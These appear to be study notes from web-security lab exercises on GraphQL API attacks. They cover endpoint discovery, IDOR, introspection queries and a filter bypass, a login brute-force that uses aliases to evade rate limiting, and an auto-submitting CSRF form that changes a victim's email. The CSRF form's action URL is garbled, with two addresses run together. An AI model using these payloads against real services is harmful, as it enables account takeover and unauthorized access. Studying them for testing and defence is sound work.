# GraphQL API vulnerabilities

## 1. Finding endpoints
```
/graphql(/v1)
/api(/v1)
/api/graphql(/v1)
/graphql/api(/v1)
/graphql/graphql(/v1)
```
### Universal queries
`__typename` reserved keyword.

Send request to endpoint `query{__typename}`
Response contains `{"data": {"__typename": "query"}} `

Send non-GraphQL request
Response : `query not present` or similar

### Request methods
best practices, only POST with content-type `application/json` (CSRF protection)
possible endpoints accepts GET, or POST with content-type `x-www-form-urlencoded`

## 2. Exploiting unsanitized arguments
Could lead to IDOR.
```
query {
        products {
            id
            name
            listed
        }
    }
```
return list `1,2,4`. `3` not showed
```
query {
        product(id: 3) {
            id
            name
            listed
        }
    }
```
## 3. Introspection queries
Secure API has introspection disabled.

Burp suite : 
- GraphQL request
  - tab - right click introspection query
- GraphQL response
  - right click - save queries to sitemap
```
 {
        "query": "{__schema{queryType{name}}}"
    }
```

```
query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
...
...
...
```
<details>
        <summary>View full introspection query</summary>

```
query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```
</details>

### GraphQL Visualizer - online tool
[GraphQL Voyager](https://apis.guru/graphql-voyager/)

### Suggestions
Even if introspection is disabled, suggestion still active.
`There is no entry for 'productInfo'. Did you mean 'productInformation' instead?).`
Tools: 
- Clairvoyance
- Burp scanner (GraphQL suggestions enabled)

### Bypass introspection defenses
Introspection disabled => maybe by using regex to exclude `__schema` keyword in queries.

- special char after `__schema`
- `__schema{` excluded, but
  - ```{
        "query": "query{__schema
        {queryType{name}}}"
    }
    ``` 
- GET / POST with x-www-form-urlencoded
  - `GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D` 

## 4. Bypass rate limiting using aliases

Some limiters are base on HTTP requests received rather than nb of operations performed.
Using aliases feature to make multiple queries in a single HTTP message. REturn multiple instances of same type of Object in one request.

```
# standard query one call of mutation
{"query":"
    mutation login($input: LoginInput!) {
        login(input: $input) {
           token
           success        }
    }","operationName":"login","variables":{
      "input":{
        "username":"carlos",
        "password":"test"
     }
   }
}
```
```
#Request with aliased queries
{
        "query":"mutation login($input: LoginInput!) {
            login(input: $input) {
                token\n        success
            }
            bruteforce0: login(input: { password: \"123456\", username: \"carlos\" }) {
                token
                success
            }
            bruteforce1: login(input: { password: \"password\", username: \"carlos\" }) {
                token
                success
            }
        }","variables":{
          "input":{
            "username":"carlos",
            "password":"test"
           }
        }
}
```
Switch to GraphQL tab to simplify query data:
```
query login($input:String){
  bruteforce0:login(input:{password: "123456", username: "carlos"}) {
    token
    success
  }
  bruteforce1:login(input:{password: "password", username: "carlos"}) {
    token
    success
  }
  bruteforce2:login(input:{password: "12345678", username: "carlos"}) {
    token
    success
  }
}
```

## 5. GraphQL CSRF
If endpoint do not validate content type of received requests and no CSRF tokens implemented

POST - application/json => secure vs forgery; content is validated
GET or others - x-www-form-urlencoded

```
<html>
	<body>
		<form method="POST" action="http://owaspbwa/ghost/blogView.phphttps://0a100042040fa701801a030a00ff007d.web-security-academy.net/graphql/v1">
			<input type="hidden" name="query" value="%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A"/>
			<input type="hidden" name="operationName" value="changeEmail"/>
			<input type="hidden" name="variables" value="%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D">
		</form>
<script>document.forms[0].submit()</script>
	</body>
<html>
```



